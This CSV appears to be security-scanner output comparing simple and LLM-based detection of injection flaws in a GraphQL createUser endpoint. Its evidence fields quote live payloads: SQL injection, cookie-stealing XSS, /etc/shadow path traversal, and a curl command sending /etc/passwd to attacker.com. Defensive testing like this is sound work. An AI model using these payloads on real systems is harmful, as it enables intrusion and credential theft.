timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T09:41:03.469502,createUser_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection attempt pattern (terminating single quote, semicolon, DROP TABLE command, and line comment syntax). While the 200 status code indicates the request was accepted, the presence of raw SQL control characters in stored data suggests: 1) Input sanitization might be incomplete, and 2) These values might be directly interpolated into SQL queries elsewhere in the system. However, confidence is not absolute as there's no direct error response or confirmation of successful database manipulation."", ""evidence"": ""firstName: Robert'); DROP TABLE Users;--"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.7, ""evidence"": ""firstName: Robert'); DROP TABLE Users;--"", ""explanation"": ""The response contains a SQL injection attempt pattern (terminating single quote, semicolon, DROP TABLE command, and line comment syntax). While the 200 status code indicates the request was accepted, the presence of raw SQL control characters in stored data suggests: 1) Input sanitization might be incomplete, and 2) These values might be directly interpolated into SQL queries elsewhere in the system. However, confidence is not absolute as there's no direct error response or confirmation of successful database manipulation.""}}]"
2025-10-08T09:41:10.764522,createUser_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns unsanitized user input containing a JavaScript payload (`<script>alert(document.cookie)</script>`) in the `firstName` field. This indicates the application does not properly validate or escape user-supplied data, which could allow stored XSS attacks if this value is rendered in a browser context. The payload directly attempts to access sensitive data (cookies), posing a high risk of session hijacking or client-side compromise."", ""evidence"": ""firstName field contains '<script>alert(document.cookie)</script>'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""firstName field contains '<script>alert(document.cookie)</script>'"", ""explanation"": ""The GraphQL response returns unsanitized user input containing a JavaScript payload (`<script>alert(document.cookie)</script>`) in the `firstName` field. This indicates the application does not properly validate or escape user-supplied data, which could allow stored XSS attacks if this value is rendered in a browser context. The payload directly attempts to access sensitive data (cookies), posing a high risk of session hijacking or client-side compromise.""}}]"
2025-10-08T09:41:28.485656,createUser_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to an internal service ('internal-api.local'), which strongly suggests the server interacts with internal network resources. If this URL is derived from user-controllable input (e.g., via GraphQL mutation arguments), it could indicate SSRF vulnerability where attackers force the server to access restricted internal systems. The confidence is conservative due to lack of explicit proof of user input control, but the presence of internal endpoints in responses warrants investigation."", ""evidence"": ""Internal URL 'http://internal-api.local/v1/secrets' in response body"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""HIGH"", ""confidence"": 0.7, ""evidence"": ""Internal URL 'http://internal-api.local/v1/secrets' in response body"", ""explanation"": ""The response contains a URL pointing to an internal service ('internal-api.local'), which strongly suggests the server interacts with internal network resources. If this URL is derived from user-controllable input (e.g., via GraphQL mutation arguments), it could indicate SSRF vulnerability where attackers force the server to access restricted internal systems. The confidence is conservative due to lack of explicit proof of user input control, but the presence of internal endpoints in responses warrants investigation.""}}]"
2025-10-08T09:41:35.736249,createUser_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The firstName field contains a payload with a semicolon (command separator) followed by a curl command attempting to exfiltrate /etc/passwd via command substitution ($()). This indicates an attempt to execute arbitrary OS commands by chaining them to the input value, suggesting insufficient input sanitization in backend user creation logic."", ""evidence"": ""firstName: 'John; curl http://attacker.com/$(cat /etc/passwd)'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""firstName: 'John; curl http://attacker.com/$(cat /etc/passwd)'"", ""explanation"": ""The firstName field contains a payload with a semicolon (command separator) followed by a curl command attempting to exfiltrate /etc/passwd via command substitution ($()). This indicates an attempt to execute arbitrary OS commands by chaining them to the input value, suggesting insufficient input sanitization in backend user creation logic.""}}]"
2025-10-08T09:41:51.653827,createUser_response_6,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes a directory traversal payload ('../../../etc/shadow') in the user description field. This strongly suggests the application is unsafely using user-controlled input in file system operations, potentially allowing attackers to read/write sensitive system files like the UNIX shadow password file. The 200 status code indicates the server accepted the payload without proper validation/sanitization."", ""evidence"": ""description: '../../../etc/shadow'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""description: '../../../etc/shadow'"", ""explanation"": ""The response includes a directory traversal payload ('../../../etc/shadow') in the user description field. This strongly suggests the application is unsafely using user-controlled input in file system operations, potentially allowing attackers to read/write sensitive system files like the UNIX shadow password file. The 200 status code indicates the server accepted the payload without proper validation/sanitization.""}}]"
2025-10-08T09:42:00.926108,createUser_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unescaped HTML payload (`<img src=x onerror=alert(1)>`) in the `firstName` field. If this value is rendered unsanitized in a browser, it would execute JavaScript (XSS). While this is technically an XSS vector, HTML injection is the precursor vulnerability enabling it. The payload demonstrates markup manipulation capabilities."", ""evidence"": ""firstName: \""<img src=x onerror=alert(1)>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""firstName: \""<img src=x onerror=alert(1)>\"""", ""explanation"": ""The response contains unescaped HTML payload (`<img src=x onerror=alert(1)>`) in the `firstName` field. If this value is rendered unsanitized in a browser, it would execute JavaScript (XSS). While this is technically an XSS vector, HTML injection is the precursor vulnerability enabling it. The payload demonstrates markup manipulation capabilities.""}}]"
2025-10-08T09:42:42.858833,createUser_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:42:52.989325,createUser_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:43:17.032546,createUser_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:43:29.708324,createUser_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The error message explicitly suggests alternative field names ('getUser' and 'getUsers') when an invalid field ('createUser') is queried. This constitutes information disclosure via field suggestions, revealing valid schema fields that could aid attackers in probing the API surface. While the suggested fields appear to be read operations rather than mutations, the pattern indicates verbose error handling that exposes implementation details."", ""evidence"": ""Did you mean \""getUser\"" or \""getUsers\""?"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Did you mean \""getUser\"" or \""getUsers\""?"", ""explanation"": ""The error message explicitly suggests alternative field names ('getUser' and 'getUsers') when an invalid field ('createUser') is queried. This constitutes information disclosure via field suggestions, revealing valid schema fields that could aid attackers in probing the API surface. While the suggested fields appear to be read operations rather than mutations, the pattern indicates verbose error handling that exposes implementation details.""}}]"
